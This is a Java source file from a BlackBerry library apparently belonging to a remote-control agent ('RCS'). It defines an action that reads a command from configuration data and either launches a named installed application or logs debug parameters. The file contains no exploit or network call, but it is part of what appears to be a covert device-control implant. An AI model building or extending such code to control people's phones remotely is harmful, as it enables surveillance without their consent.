//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : ExecuteAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import java.io.ByteArrayOutputStream;
import java.io.EOFException;
import java.util.Date;
import java.util.Vector;

import javax.microedition.media.Player;
import javax.microedition.media.control.RecordControl;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.util.DataBuffer;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.utils.Check;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class ExecuteAction.
 */
public final class ExecuteAction extends SubAction {
    //#ifdef DEBUG
    static Debug debug = new Debug("ExecuteAction", DebugLevel.VERBOSE);
    //#endif

    private String command;
    

    /**
     * Instantiates a new execute action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public ExecuteAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Event triggeringEvent) {

        String eventName = "NULL";
        if (triggeringEvent != null) {
            eventName = triggeringEvent.toString();
        }

        //#ifdef DEBUG
        debug.info("Execute: " + command);
        debug.info("Event: " + eventName);
        //#endif

        if (command == null) {
            //#ifdef DEBUG
            debug.trace("execute no command");
            //#endif
            return false;
        }

        ApplicationDescriptor applicationDescriptor = getApplicationDescriptor(command);
        if (applicationDescriptor != null) {
            executeApplication(applicationDescriptor);
        } else {

            final Vector params = new Vector();
            final String cmd = getParams(command, params);

            if (cmd.equals("DEBUG")) {
                executeDebug(params);
            }
        }

        return true;
    }

    private void executeApplication(ApplicationDescriptor applicationDescriptor) {
        try{
            String urlModule = applicationDescriptor.getModuleName();
            //#ifdef DEBUG
            debug.trace("executeApplication: "+urlModule);
            //#endif
            ApplicationManager.getApplicationManager().launch(urlModule);
        }catch(Exception ex){
            //#ifdef DEBUG
            debug.error("executeApplication: "+ex);
            //#endif
        }
    }

    private void executeDebug(final Vector params) {
        //#ifdef DEBUG     
        for (int i = 0; i < params.size(); i++) {
            debug.info("executeDebug: " + params.elementAt(i));
        }
        //#endif
    }

    private Player _player;
    private RecordControl _rcontrol;
    private ByteArrayOutputStream _output;
    private byte _data[];

    private static String getParams(final String fullCommand,
            final Vector params) {

        //#ifdef DBC
        Check.requires(fullCommand != null, "getParams cmd !=null");
        Check.requires(params != null, "getParams params !=null");
        Check.requires(params.size() == 0, "getParams params.size() == 0");
        //#endif

        final Vector vector = Utils.Tokenize(fullCommand, " ");

        //#ifdef DBC
        Check.asserts(vector != null, "getParams array !=null");
        Check.asserts(vector.size() > 0, "getParams array.length > 0");
        //#endif

        final String command = (String) vector.elementAt(0);

        for (int i = 1; i < vector.size(); i++) {
            params.addElement(vector.elementAt(i));
        }

        return command;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        if (confParams == null) {
            command = "DEBUG";
        } else {
            // estrarre la stringa.
            final DataBuffer databuffer = new DataBuffer(confParams, 0,
                    confParams.length, false);
            try {
                final int len = databuffer.readInt();
                final byte[] buffer = new byte[len];
                databuffer.read(buffer);
                command = WChar.getString(buffer, true);

            } catch (final EOFException e) {
                return false;
            }
        }

        //#ifdef DEBUG
        debug.info("command: " + command);
        //#endif
        return true;
    }

    private ApplicationDescriptor getApplicationDescriptor(String command) {
        //#ifdef DBC
        Check
                .requires(command != null,
                        "getApplicationDescriptor null command");
        //#endif

        Vector tokens = Utils.Tokenize(command, " ");
        if (tokens == null || tokens.size() == 0) {
            //#ifdef DEBUG
            debug.error("getApplicationDescriptor: empty command");
            //#endif
            return null;
        }

        String executeName = (String) tokens.elementAt(0);
        //#ifdef DEBUG
        debug.trace("getApplicationDescriptor executeName= " + executeName);
        //#endif

        final int handles[] = CodeModuleManager.getModuleHandles();

        final int size = handles.length;
        for (int i = 0; i < size; i++) {
            final int handle = handles[i];
            // CodeModuleManager.getModuleHandle(name)
            // Retrieve specific information about a module.

            final String name = CodeModuleManager.getModuleName(handle);
            if (name.equals(executeName)) {
                //#ifdef DEBUG
                debug.trace("checkCommand, command found: " + command);
                //#endif
                ApplicationDescriptor[] apps = CodeModuleManager
                        .getApplicationDescriptors(handle);
                if (apps != null && apps.length > 0) {
                    //#ifdef DEBUG
                    debug.trace("checkCommand: got applicationDescription");
                    //#endif
                    return apps[0];

                }
            }
        }

        //#ifdef DEBUG
        debug.warn("getApplicationDescriptor: not found");
        //#endif
        return null;

    }

    public String toString() {
        return "Execute " + command;
    }
}
